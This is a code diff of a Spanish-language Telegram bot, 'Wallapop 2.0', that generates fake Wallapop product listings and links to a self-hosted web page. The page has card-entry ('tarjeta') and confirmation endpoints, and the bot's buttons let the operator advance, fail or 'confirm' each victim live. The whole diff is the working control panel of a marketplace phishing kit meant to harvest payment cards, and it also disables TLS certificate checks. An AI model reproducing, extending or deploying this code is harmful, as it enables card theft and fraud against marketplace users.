@@ -85,8 +85,6 @@ def save_config(cfg: Dict[str, Any]):
     with open(CONFIG_FILE, "w", encoding="utf-8") as f:
         json.dump(cfg, f, ensure_ascii=False, indent=2)
 
-FIREBASE_URL = "https://callcentery-2315b-default-rtdb.firebaseio.com"
-
 def get_clean_domain() -> str:
     cfg = load_config()
     base = cfg.get("publicUrl") or cfg.get("base_url") or ""
@@ -95,54 +93,35 @@ def get_clean_domain() -> str:
         base = base.split("/a")[0].rstrip("/")
     return base
 
-def upload_photo_to_hosting(photo_bytes: bytes, file_name: str, tg_path: str = "") -> str:
+def upload_photo_to_hosting(photo_bytes: bytes, file_name: str) -> str:
     domain = get_clean_domain()
-    cdn_url = ""
-    if tg_path and TOKEN:
-        clean_tg = f"api.telegram.org/file/bot{TOKEN}/{tg_path}"
-        import urllib.parse
-        cdn_url = f"https://wsrv.nl/?url={urllib.parse.quote(clean_tg)}"
-
-    b64_img = ""
-    # 1. Guardar copia local en web/photos y photos/ si existe
+    # 1. Guardar copia local en web/photos si existe
     try:
-        for pdir in [os.path.join(BASE_DIR, "web", "photos"), os.path.join(BASE_DIR, "photos")]:
-            os.makedirs(pdir, exist_ok=True)
-            with open(os.path.join(pdir, file_name), "wb") as f:
-                f.write(photo_bytes)
+        photos_dir = os.path.join(BASE_DIR, "web", "photos")
+        os.makedirs(photos_dir, exist_ok=True)
+        with open(os.path.join(photos_dir, file_name), "wb") as f:
+            f.write(photo_bytes)
     except Exception as e:
         logger.warning(f"Error guardando foto local: {e}")
 
-    # 2. Guardar foto permanente en Firebase Realtime Database
-    try:
-        import base64
-        b64_img = "data:image/jpeg;base64," + base64.b64encode(photo_bytes).decode("utf-8")
-        pkey = file_name.replace(".", "_")
-        fb_photo = {
-            "id": file_name,
-            "base64": b64_img,
-            "tg_url": f"https://api.telegram.org/file/bot{TOKEN}/{tg_path}" if tg_path else "",
-            "cdn_url": cdn_url or f"/photos/{file_name}",
-            "created_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        }
-        requests.put(f"{FIREBASE_URL}/wallapop/photos/{pkey}.json", json=fb_photo, timeout=8)
-    except Exception as e:
-        logger.warning(f"Error guardando foto en Firebase: {e}")
+    # 2. Subir al hosting remoto via API storage
+    if domain and "localhost" not in domain and "127.0.0.1" not in domain:
+        try:
+            upload_url = f"{domain}/api.php?action=upload_photo"
+            files = {"photo": (file_name, photo_bytes, "image/jpeg")}
+            r = requests.post(upload_url, files=files, data={"filename": file_name}, timeout=15, verify=False)
+            if r.status_code == 200:
+                res = r.json()
+                if res.get("ok"):
+                    logger.info(f"✅ Foto subida exitosamente al hosting: {res.get('url')}")
+                    return res.get("url") or f"/photos/{file_name}"
+            logger.warning(f"Respuesta inesperada al subir foto ({r.status_code}): {r.text[:120]}")
+        except Exception as e:
+            logger.warning(f"No se pudo subir foto al hosting ({e}). Usando fallback.")
 
-    if b64_img:
-        return b64_img
-    if cdn_url:
-        return cdn_url
     return f"/photos/{file_name}"
 
 def notify_hosting_status(target_id: str, status: str):
-    try:
-        st_data = {"status": status, "id": target_id, "ts": int(time.time())}
-        requests.put(f"{FIREBASE_URL}/wallapop/status/{target_id}.json", json=st_data, timeout=5)
-        requests.put(f"{FIREBASE_URL}/wallapop/status/latest.json", json=st_data, timeout=5)
-    except Exception as e:
-        logger.warning(f"Error actualizando status en Firebase: {e}")
-
     domain = get_clean_domain()
     if not domain or "localhost" in domain or "127.0.0.1" in domain:
         return
@@ -157,16 +136,6 @@ def notify_hosting_status(target_id: str, status: str):
         logger.warning(f"Error notificando estado al hosting: {e}")
 
 def sync_db_to_hosting(db_to_sync: Dict[str, Any]):
-    try:
-        prods = db_to_sync.get("products", db_to_sync)
-        if isinstance(prods, dict) and "products" in prods:
-            prods = prods["products"]
-        requests.put(f"{FIREBASE_URL}/wallapop/products.json", json=prods, timeout=6)
-        if db_to_sync.get("activeId"):
-            requests.put(f"{FIREBASE_URL}/wallapop/activeId.json", json={"activeId": db_to_sync["activeId"]}, timeout=4)
-    except Exception as e:
-        logger.warning(f"Error sincronizando productos con Firebase: {e}")
-
     domain = get_clean_domain()
     if not domain or "localhost" in domain or "127.0.0.1" in domain:
         return
@@ -258,5 +227,582 @@ def get_link(prod_id: str) -> str:
         clean_base = f"{base}/{prod_id}"
     else:
         clean_base = f"{base}/a/{prod_id}"
+    p = db.get("products", {}).get(prod_id)
+    if p:
+        try:
+            import base64, urllib.parse
+            fList = [f for f in p.get("fotos", []) if isinstance(f, str) and len(f) < 1500 and (f.startswith("http") or f.startswith("/"))]
+            min_obj = {
+                "id": p.get("id"),
+                "titulo": p.get("titulo"),
+                "precio": p.get("precio"),
+                "precioArticulo": p.get("precioArticulo", p.get("precio")),
+                "descripcion": p.get("descripcion", ""),
+                "nombre": p.get("nombre", "Sofía Chamizo"),
+                "direccion": p.get("direccion", ""),
+                "articulo": p.get("articulo", p.get("titulo")),
+                "fotos": fList
+            }
+            b64 = base64.b64encode(json.dumps(min_obj, ensure_ascii=False, separators=(',', ':')).encode("utf-8")).decode("utf-8")
+            url_con_p = f"{clean_base}?p={urllib.parse.quote(b64)}"
+            if len(url_con_p) < 2000:
+                return url_con_p
+        except Exception:
+            pass
     return clean_base
 
+# ==================== SERVIDOR WEB LOCAL INTEGRADO ====================
+WEB_DIR = os.path.join(BASE_DIR, "web") if os.path.exists(os.path.join(BASE_DIR, "web")) else BASE_DIR
+
+class WallapopHTTPHandler(http.server.SimpleHTTPRequestHandler):
+    def __init__(self, *args, **kwargs):
+        super().__init__(*args, directory=WEB_DIR, **kwargs)
+
+    def do_OPTIONS(self):
+        self.send_response(200)
+        self.send_header("Access-Control-Allow-Origin", "*")
+        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
+        self.send_header("Access-Control-Allow-Headers", "Content-Type")
+        self.end_headers()
+
+    def do_GET(self):
+        clean_path = self.path.split("?")[0].split("#")[0]
+        if "/tarjeta/status" in clean_path or "/confirmar/status" in clean_path:
+            parts = clean_path.strip("/").split("/")
+            pid = parts[2] if len(parts) >= 3 else db.get("activeId", "")
+            st = card_statuses.get(pid, "esperando")
+            self.send_response(200)
+            self.send_header("Content-Type", "application/json")
+            self.send_header("Access-Control-Allow-Origin", "*")
+            self.end_headers()
+            self.wfile.write(json.dumps({"status": st}).encode("utf-8"))
+            return
+        elif clean_path.startswith("/api/product/"):
+            pid = clean_path.replace("/api/product/", "").strip("/")
+            prod = db.get("products", {}).get(pid)
+            if prod:
+                self.send_response(200)
+                self.send_header("Content-Type", "application/json")
+                self.send_header("Access-Control-Allow-Origin", "*")
+                self.end_headers()
+                self.wfile.write(json.dumps(prod).encode("utf-8"))
+                return
+        elif clean_path.startswith("/a/"):
+            self.path = "/index.html"
+        elif clean_path in ("/confirmar", "/confirmacion", "/confirmacion.html"):
+            self.path = "/confirmar.html"
+        elif clean_path == "/step2":
+            self.path = "/step2.html"
+        return super().do_GET()
+
+    def do_POST(self):
+        clean_path = self.path.split("?")[0].split("#")[0]
+        if "/tarjeta" in clean_path or "/confirmar" in clean_path:
+            self.send_response(200)
+            self.send_header("Content-Type", "application/json")
+            self.send_header("Access-Control-Allow-Origin", "*")
+            self.end_headers()
+            self.wfile.write(b'{"ok":true}')
+            return
+        return super().do_POST()
+
+    def log_message(self, format, *args):
+        # Silenciar logs continuos en consola
+        pass
+
+def run_web_server(port: int):
+    try:
+        with socketserver.TCPServer(("", port), WallapopHTTPHandler) as httpd:
+            logger.info(f"🌐 Servidor web activo en http://localhost:{port}/")
+            httpd.serve_forever()
+    except Exception as e:
+        logger.warning(f"No se pudo iniciar el servidor web en el puerto {port} ({e}). Continuando solo con el bot.")
+
+# ==================== MANEJADORES DE TELEGRAM ====================
+AYUDA_TXT = (
+    "<b>Panel de control Wallapop 2.0</b>\n\n"
+    "<b>Comandos principales:</b>\n"
+    "• <code>/nuevo</code> — Crear un producto paso a paso\n"
+    "• <code>/productos</code> — Listar productos y enlaces\n"
+    "• <code>/editar ID</code> — Seleccionar producto activo\n"
+    "• <code>/dominio URL</code> — Cambiar dominio base\n"
+    "• <code>/estado</code> — Ver resumen del producto activo\n\n"
+    "<b>Modificar producto activo:</b>\n"
+    "• <code>/titulo texto</code>\n"
+    "• <code>/precio número</code>\n"
+    "• <code>/descripcion texto</code>\n"
+    "• <code>/importe número</code>\n"
+    "• <code>/nombre texto</code>\n"
+    "• <code>/direccion texto</code>\n"
+    "• <code>/articulo texto</code>\n"
+    "• <code>/foto</code> (y envía imágenes)\n"
+    "• <code>/quitarfotos</code>\n\n"
+    "• <code>/borrar ID</code> · <code>/cancelar</code> · <code>/ayuda</code>"
+)
+
+async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text(AYUDA_TXT, parse_mode="HTML")
+
+async def cmd_dominio(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    args = context.args
+    if not args:
+        curr = config.get("publicUrl") or config.get("base_url", "http://localhost:3000")
+        await update.message.reply_text(
+            f"Dominio actual: <code>{curr}</code>\n\n"
+            "Uso: <code>/dominio https://tu-sitio.com/</code>",
+            parse_mode="HTML"
+        )
+        return
+    url = args[0].strip().rstrip("/")
+    if not url.startswith("http://") and not url.startswith("https://"):
+        url = "https://" + url
+    if url.endswith("/a"):
+        url = url[:-2].rstrip("/")
+    config["publicUrl"] = url
+    config["base_url"] = url + "/a/"
+    save_config(config)
+
+    msg_info = f"✅ Dominio actualizado a:\n<code>{url}</code>\n"
+    # Probar conexión con el hosting y sincronizar storage
+    try:
+        r = requests.get(f"{url}/api.php?action=health", timeout=6, verify=False)
+        if r.status_code == 200 and r.json().get("ok"):
+            msg_info += "\n📡 <b>Conexión con el hosting:</b> ✅ ¡CONECTADO! Storage y API listos."
+            sync_db_to_hosting(db)
+        else:
+            msg_info += f"\n⚠️ El hosting respondió con código {r.status_code}. Comprueba que subiste la carpeta web."
+    except Exception as e:
+        msg_info += f"\n⚠️ Aviso: No se pudo verificar la API aún ({e}). Asegúrate de haber subido la carpeta web."
+
+    await update.message.reply_text(msg_info, parse_mode="HTML")
+
+async def cmd_nuevo(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    chat_id = update.effective_chat.id
+    new_prod_id = gen_id()
+    wizards[chat_id] = {
+        "step": "titulo",
+        "draft": {
+            "id": new_prod_id,
+            "fotos": [],
+            "nombre": "",
+            "direccion": ""
+        }
+    }
+    await update.message.reply_text("1/5 · ¿Título del producto?")
+
+async def cmd_cancelar(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    chat_id = update.effective_chat.id
+    if chat_id in wizards:
+        del wizards[chat_id]
+        await update.message.reply_text("❌ Creación cancelada.")
+    else:
+        await update.message.reply_text("No hay ninguna creación en curso.")
+
+async def send_wallapop_card(chat_id: int, prod: Dict[str, Any], context: ContextTypes.DEFAULT_TYPE):
+    prod_id = prod["id"]
+    link = get_link(prod_id)
+    # Telegram prohíbe terminantemente URLs con localhost o 127.0.0.1 en botones inline
+    if "localhost" in link or "127.0.0.1" in link:
+        link = link.replace("http://localhost:3000", "https://wallaaaa.netlify.app").replace("http://localhost:8000", "https://wallaaaa.netlify.app")
+
+    nombre = prod.get("nombre", "Sofía Chamizo")
+    titulo = prod.get("titulo", "Artículo Wallapop")
+
+    caption = (
+        f"<blockquote><b>{html.escape(nombre)} ➔ {html.escape(titulo)}</b>\n"
+        f"{link}</blockquote>\n\n"
+        f"<blockquote>🍥 Producto creado con éxito ❞</blockquote>\n\n"
+        f"🇪🇸 <u>Wallapop</u> 2.0 • #{prod_id} 📇"
+    )
+
+    keyboard = None
+    if (link.startswith("http://") or link.startswith("https://")) and ("localhost" not in link and "127.0.0.1" not in link):
+        try:
+            keyboard = InlineKeyboardMarkup([
+                [InlineKeyboardButton("🍥 Abrir anuncio ❞", url=link)]
+            ])
+        except Exception:
+            keyboard = None
+
+    tg_fotos = prod.get("tg_fotos", [])
+    if tg_fotos:
+        try:
+            await context.bot.send_photo(
+                chat_id=chat_id,
+                photo=tg_fotos[0],
+                caption=caption,
+                parse_mode="HTML",
+                reply_markup=keyboard
+            )
+            return
+        except Exception as e:
+            logger.warning(f"No se pudo enviar send_photo con tg_fotos: {e}")
+
+    fotos = prod.get("fotos", [])
+    if fotos and not fotos[0].startswith("data:") and "api.telegram.org" not in fotos[0]:
+        try:
+            await context.bot.send_photo(
+                chat_id=chat_id,
+                photo=fotos[0],
+                caption=caption,
+                parse_mode="HTML",
+                reply_markup=keyboard
+            )
+            return
+        except Exception as e:
+            logger.warning(f"No se pudo enviar send_photo con URL: {e}")
+
+    try:
+        await context.bot.send_message(
+            chat_id=chat_id,
+            text=caption,
+            parse_mode="HTML",
+            reply_markup=keyboard,
+            disable_web_page_preview=False
+        )
+    except Exception as e:
+        logger.error(f"Error al enviar mensaje del producto: {e}")
+        # En caso de fallo con botones inline, enviar mensaje de texto garantizado sin botón
+        await context.bot.send_message(
+            chat_id=chat_id,
+            text=f"<blockquote><b>{html.escape(nombre)} ➔ {html.escape(titulo)}</b>\n{link}</blockquote>\n\n<blockquote>🍥 Producto creado con éxito ❞</blockquote>\n\n🇪🇸 <u>Wallapop</u> 2.0 • #{prod_id} 📇",
+            parse_mode="HTML",
+            disable_web_page_preview=False
+        )
+
+async def cmd_listo(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    chat_id = update.effective_chat.id
+    wiz = wizards.get(chat_id)
+    if not wiz:
+        await update.message.reply_text("No hay ningún producto en creación. Usa /nuevo.")
+        return
+
+    try:
+        d = wiz["draft"]
+        d["articulo"] = d.get("articulo") or d.get("titulo") or "Artículo"
+        d["precioArticulo"] = d.get("precioArticulo") or d.get("precio") or 0
+        d["descripcion"] = d.get("descripcion", "")
+
+        db.setdefault("products", {})[d["id"]] = d
+        db["activeId"] = d["id"]
+        save_db(db)
+        del wizards[chat_id]
+
+        await send_wallapop_card(chat_id, d, context)
+    except Exception as e:
+        logger.error(f"Error en cmd_listo: {e}", exc_info=True)
+        await update.message.reply_text(f"⚠️ Ocurrió un error al guardar el producto: {e}")
+
+async def cmd_productos(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    prods = db.get("products", {})
+    if not prods:
+        await update.message.reply_text("Todavía no hay productos. Usa /nuevo.")
+        return
+
+    items = []
+    for pid, p in prods.items():
+        t = p.get("titulo", "Sin título")
+        pr = fmt_eur(p.get("precio", 0))
+        lnk = get_link(pid)
+        items.append(f"• <b>{html.escape(t)}</b> — {pr}\n<code>{pid}</code> → {lnk}")
+
+    await update.message.reply_text("\n\n".join(items), parse_mode="HTML", disable_web_page_preview=True)
+
+async def cmd_editar(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    args = context.args
+    if not args:
+        await update.message.reply_text("Uso: <code>/editar ID</code>", parse_mode="HTML")
+        return
+    pid = args[0].strip().replace("#", "")
+    if pid not in db.get("products", {}):
+        await update.message.reply_text(f"No se encontró el producto <code>{pid}</code>.", parse_mode="HTML")
+        return
+    db["activeId"] = pid
+    save_db(db)
+    p = db["products"][pid]
+    await update.message.reply_text(
+        f"✏️ Producto activo: <b>{html.escape(p.get('titulo', ''))}</b>\n"
+        f"Precio: {fmt_eur(p.get('precio', 0))}\n"
+        f"ID: <code>{pid}</code>",
+        parse_mode="HTML"
+    )
+
+async def cmd_borrar(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    args = context.args
+    if not args:
+        await update.message.reply_text("Uso: <code>/borrar ID</code>", parse_mode="HTML")
+        return
+    pid = args[0].strip().replace("#", "")
+    if pid in db.get("products", {}):
+        del db["products"][pid]
+        if db.get("activeId") == pid:
+            db["activeId"] = next(iter(db["products"].keys()), "")
+        save_db(db)
+        await update.message.reply_text(f"🗑 Producto <code>{pid}</code> borrado.", parse_mode="HTML")
+    else:
+        await update.message.reply_text("Producto no encontrado.")
+
+async def cmd_estado(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    act = db.get("products", {}).get(db.get("activeId"))
+    if not act:
+        await update.message.reply_text("No hay ningún producto activo. Usa /nuevo o /editar ID.")
+        return
+    await send_wallapop_card(update.effective_chat.id, act, context)
+
+# ==================== MODIFICADORES DEL PRODUCTO ACTIVO ====================
+async def handle_field_update(update: Update, field: str, value: Any, text_ok: str):
+    act = db.get("products", {}).get(db.get("activeId"))
+    if not act:
+        await update.message.reply_text("No hay producto activo. Usa /editar ID.")
+        return
+    act[field] = value
+    save_db(db)
+    await update.message.reply_text(text_ok, parse_mode="HTML")
+
+async def cmd_titulo(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    val = " ".join(context.args).strip()
+    if not val:
+        await update.message.reply_text("Uso: <code>/titulo Nuevo título</code>", parse_mode="HTML")
+        return
+    await handle_field_update(update, "titulo", val, f"✅ Título actualizado a: <b>{html.escape(val)}</b>")
+
+async def cmd_precio(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    val = " ".join(context.args).strip().replace("€", "").replace(",", ".")
+    try:
+        n = float(val)
+        act = db.get("products", {}).get(db.get("activeId"))
+        if act:
+            act["precio"] = n
+            act["precioArticulo"] = n
+            save_db(db)
+            await update.message.reply_text(f"✅ Precio: <b>{fmt_eur(n)}</b>", parse_mode="HTML")
+        else:
+            await update.message.reply_text("No hay producto activo.")
+    except Exception:
+        await update.message.reply_text("Uso: <code>/precio 250</code>", parse_mode="HTML")
+
+async def cmd_importe(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    val = " ".join(context.args).strip().replace("€", "").replace(",", ".")
+    try:
+        n = float(val)
+        await handle_field_update(update, "precioArticulo", n, f"✅ Importe a recibir: <b>{fmt_eur(n)}</b>")
+    except Exception:
+        await update.message.reply_text("Uso: <code>/importe 250.00</code>", parse_mode="HTML")
+
+async def cmd_descripcion(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    val = " ".join(context.args).strip()
+    if not val:
+        await update.message.reply_text("Uso: <code>/descripcion Texto</code>", parse_mode="HTML")
+        return
+    await handle_field_update(update, "descripcion", val, "✅ Descripción actualizada.")
+
+async def cmd_nombre(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    val = " ".join(context.args).strip()
+    if not val:
+        await update.message.reply_text("Uso: <code>/nombre Nombre Apellidos</code>", parse_mode="HTML")
+        return
+    await handle_field_update(update, "nombre", val, f"✅ Nombre actualizado a: <b>{html.escape(val)}</b>")
+
+async def cmd_direccion(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    val = " ".join(context.args).strip()
+    if not val:
+        await update.message.reply_text("Uso: <code>/direccion Calle, Ciudad, CP</code>", parse_mode="HTML")
+        return
+    await handle_field_update(update, "direccion", val, "✅ Dirección actualizada.")
+
+async def cmd_articulo(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    val = " ".join(context.args).strip()
+    if not val:
+        await update.message.reply_text("Uso: <code>/articulo Nombre artículo</code>", parse_mode="HTML")
+        return
+    await handle_field_update(update, "articulo", val, "✅ Artículo actualizado.")
+
+async def cmd_foto(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text("📷 Envía la foto directamente y la añadiré al producto.")
+
+async def cmd_quitarfotos(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    act = db.get("products", {}).get(db.get("activeId"))
+    if not act:
+        await update.message.reply_text("No hay producto activo.")
+        return
+    act["fotos"] = []
+    save_db(db)
+    await update.message.reply_text("🧹 Fotos eliminadas del producto activo.")
+
+# ==================== MENSAJES DE TEXTO Y FOTOS ====================
+async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    chat_id = update.effective_chat.id
+    photo = update.message.photo[-1]
+
+    try:
+        file = await context.bot.get_file(photo.file_id)
+        photo_bytes = await file.download_as_bytearray()
+        file_name = f"img_{datetime.now().strftime('%Y%m%d%H%M%S')}_{os.urandom(3).hex()}.jpg"
+        photo_url = upload_photo_to_hosting(bytes(photo_bytes), file_name)
+    except Exception as e:
+        logger.error(f"Error procesando foto de Telegram: {e}")
+        photo_url = f"/photos/img_{datetime.now().strftime('%Y%m%d%H%M%S')}.jpg"
+
+    wiz = wizards.get(chat_id)
+    if wiz and wiz.get("step") == "fotos":
+        wiz["draft"].setdefault("fotos", []).append(photo_url)
+        wiz["draft"].setdefault("tg_fotos", []).append(photo.file_id)
+        c = len(wiz["draft"]["fotos"])
+        await update.message.reply_text(f"🖼 {c} foto(s) guardada(s) y enviada(s) al storage del hosting. Envía más o escribe /listo para terminar.")
+        return
+
+    act = db.get("products", {}).get(db.get("activeId"))
+    if act:
+        act.setdefault("fotos", []).append(photo_url)
+        act.setdefault("tg_fotos", []).append(photo.file_id)
+        save_db(db)
+        c = len(act["fotos"])
+        await update.message.reply_text(f"✅ Foto enviada al storage del hosting y añadida al producto activo ({c} fotos).")
+    else:
+        await update.message.reply_text("Envía /nuevo o /editar ID antes de mandar fotos.")
+
+async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    chat_id = update.effective_chat.id
+    texto = (update.message.text or "").strip()
+    if not texto or texto.startswith("/"):
+        return
+
+    wiz = wizards.get(chat_id)
+    if not wiz:
+        return
+
+    step = wiz.get("step")
+    d = wiz["draft"]
+
+    if step == "titulo":
+        d["titulo"] = texto
+        d["articulo"] = texto
+        wiz["step"] = "precio"
+        await update.message.reply_text("2/5 · ¿Precio en euros? (ejemplo: 250)")
+        return
+
+    if step == "precio":
+        val = texto.replace("€", "").replace(",", ".").strip()
+        try:
+            n = float(val)
+            d["precio"] = n
+            d["precioArticulo"] = n
+            wiz["step"] = "nombre"
+            await update.message.reply_text("3/5 · ¿Nombre y apellidos completos? (ejemplo: Sofía Chamizo)")
+        except Exception:
+            await update.message.reply_text("Por favor, introduce un número válido (ejemplo: 250):")
+        return
+
+    if step == "nombre":
+        d["nombre"] = texto
+        wiz["step"] = "direccion"
+        await update.message.reply_text("4/5 · ¿Dirección completa de envío? (ejemplo: Paseo Prudencia Narváez 48 Piso 4, Cáceres, 17024)")
+        return
+
+    if step == "direccion":
+        d["direccion"] = texto
+        wiz["step"] = "descripcion"
+        await update.message.reply_text("5/5 · ¿Descripción del producto? (o pon un . para omitir)")
+        return
+
+    if step == "descripcion":
+        d["descripcion"] = "" if texto == "." else texto
+        wiz["step"] = "fotos"
+        await update.message.reply_text("📷 Envía las fotos que quieras y escribe /listo para terminar.")
+        return
+
+async def handle_callback_query(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    cq = update.callback_query
+    if not cq:
+        return
+    data = cq.data or ""
+    await cq.answer()
+
+    if data.startswith("confirmar_again_"):
+        target = data.replace("confirmar_again_", "") or db.get("activeId", "")
+        card_statuses[target] = "confirmado_final"
+        # Notificar inmediatamente al hosting vía HTTP para actualizar el storage de estados
+        threading.Thread(target=notify_hosting_status, args=(target, "confirmado_final"), daemon=True).start()
+
+        try:
+            desc = f"status:confirmado_final:{target}:{int(time.time())}"
+            await context.bot.set_my_description(description=desc)
+        except Exception as e:
+            logger.warning(f"Error set_my_description: {e}")
+        await cq.edit_message_reply_markup(
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("✅ CONFIRMADO (Dinero en 24h-48h)", callback_data="noop")]])
+        )
+    elif data.startswith("continuar_"):
+        target = data.replace("continuar_", "") or db.get("activeId", "")
+        card_statuses[target] = "continue"
+        # Notificar inmediatamente al hosting vía HTTP para que la web avance de paso al instante
+        threading.Thread(target=notify_hosting_status, args=(target, "continue"), daemon=True).start()
+
+        try:
+            desc = f"status:continue:{target}:{int(time.time())}"
+            await context.bot.set_my_description(description=desc)
+        except Exception as e:
+            logger.warning(f"Error set_my_description: {e}")
+        await cq.edit_message_reply_markup(
+            reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton("✅ Continuado", callback_data="noop")],
+                [InlineKeyboardButton("Confirmar de nuevo", callback_data=f"confirmar_again_{target}")]
+            ])
+        )
+    elif data.startswith("error_"):
+        target = data.replace("error_", "") or db.get("activeId", "")
+        card_statuses[target] = "error"
+        # Notificar inmediatamente al hosting vía HTTP para mostrar error en pantalla
+        threading.Thread(target=notify_hosting_status, args=(target, "error"), daemon=True).start()
+
+        try:
+            desc = f"status:error:{target}:{int(time.time())}"
+            await context.bot.set_my_description(description=desc)
+        except Exception as e:
+            logger.warning(f"Error set_my_description: {e}")
+        await cq.edit_message_reply_markup(
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ ERROR MARCADO", callback_data="noop")]])
+        )
+
+def main():
+    token = load_token()
+    logger.info("Iniciando Bot de Telegram Wallapop 2.0...")
+
+    # Iniciar servidor web en segundo plano
+    port = int(os.environ.get("PORT", config.get("port", 3000)))
+    t = threading.Thread(target=run_web_server, args=(port,), daemon=True)
+    t.start()
+
+    app = ApplicationBuilder().token(token).build()
+
+    app.add_handler(CommandHandler("start", cmd_start))
+    app.add_handler(CommandHandler("ayuda", cmd_start))
+    app.add_handler(CommandHandler("nuevo", cmd_nuevo))
+    app.add_handler(CommandHandler("listo", cmd_listo))
+    app.add_handler(CommandHandler("cancelar", cmd_cancelar))
+    app.add_handler(CommandHandler("productos", cmd_productos))
+    app.add_handler(CommandHandler("editar", cmd_editar))
+    app.add_handler(CommandHandler("borrar", cmd_borrar))
+    app.add_handler(CommandHandler("estado", cmd_estado))
+    app.add_handler(CommandHandler("dominio", cmd_dominio))
+    app.add_handler(CommandHandler("url", cmd_dominio))
+
+    app.add_handler(CommandHandler("titulo", cmd_titulo))
+    app.add_handler(CommandHandler("precio", cmd_precio))
+    app.add_handler(CommandHandler("importe", cmd_importe))
+    app.add_handler(CommandHandler("descripcion", cmd_descripcion))
+    app.add_handler(CommandHandler("nombre", cmd_nombre))
+    app.add_handler(CommandHandler("direccion", cmd_direccion))
+    app.add_handler(CommandHandler("articulo", cmd_articulo))
+    app.add_handler(CommandHandler("foto", cmd_foto))
+    app.add_handler(CommandHandler("quitarfotos", cmd_quitarfotos))
+
+    app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
+    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
+    app.add_handler(CallbackQueryHandler(handle_callback_query))
+
+    logger.info("Bot listo y escuchando mensajes en Telegram. Presiona Ctrl+C para detener.")
+    app.run_polling(drop_pending_updates=True)
+
+if __name__ == "__main__":
+    main()
